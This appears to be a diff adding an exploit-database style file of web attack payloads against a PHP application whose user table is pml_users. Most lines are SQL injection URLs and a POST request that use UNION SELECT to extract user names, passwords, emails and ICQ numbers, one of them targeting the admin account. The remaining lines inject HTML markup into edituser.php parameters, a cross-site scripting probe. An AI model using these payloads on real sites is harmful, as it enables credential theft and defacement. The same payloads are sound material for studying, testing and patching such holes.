@@ -1,0 +1,14 @@
+http://www.example.com/edituser.php?Active=index&amp;action=details&amp;ID=-850&#039;+union+select+0,name,1,pass,3,4,5,6,7,8,9,10,11,12,13,14,15+from+pml_users+limit+1,1/*
+
+POST /activate.php?action=resendsave HTTP/1.1
+Host: localhost
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+ReSendUser=cekac&#039; union select 0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6#
+
+http://www.example.com/list.php?Active=INTERNET_OPASNOSTE&#039;+union+select+1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,concat_ws(char(58),name,pass,email,icq),23,24,25,26,27,28,29,30,31,32,33+from+pml_users+where+name=&#039;admin&#039;+and+1=&#039;1
+
+http://www.example.com/edituser.php?Active=index&amp;Display=&amp;&amp;action=&lt;h1&gt;onotole power&lt;/h1&gt;
+
+http://www.example.com /edituser.php?Active=index&amp;Display=&amp;action=&amp;F=&amp;fltname=&#039;&gt;&lt;h1&gt;upyachka,upyachka&lt;/h1&gt;&lt;div style=display:none&gt;
